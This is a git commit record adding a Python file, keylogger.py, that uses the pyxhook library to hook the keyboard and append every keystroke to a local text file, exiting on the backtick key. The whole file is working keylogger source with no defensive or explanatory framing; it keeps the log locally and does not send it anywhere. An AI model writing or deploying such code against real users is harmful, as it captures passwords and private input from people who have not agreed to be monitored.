4e4a8fa82ace1991288fa3ad3bc9cc66f612c91b
Archit Gupta <archit.941@gmail.com>
2019-05-01 20:51:09 -0500

    a

---
+++ keylogger.py
@@ -0,0 +1,21 @@
+import pyxhook
+
+log_file='/Users/architgupta/Desktop/log.txt'
+
+#this function is called everytime a key is pressed.
+def OnKeyPress(event):
+    fob=open(log_file,'a')
+    fob.write(event.Key)
+    fob.write('\n')
+
+    if event.Ascii==96: #special character to exit
+        fob.close()
+        new_hook.cancel()
+
+new_hook=pyxhook.HookManager()
+
+new_hook.KeyDown=OnKeyPress
+
+new_hook.HookKeyboard()
+
+new_hook.start()
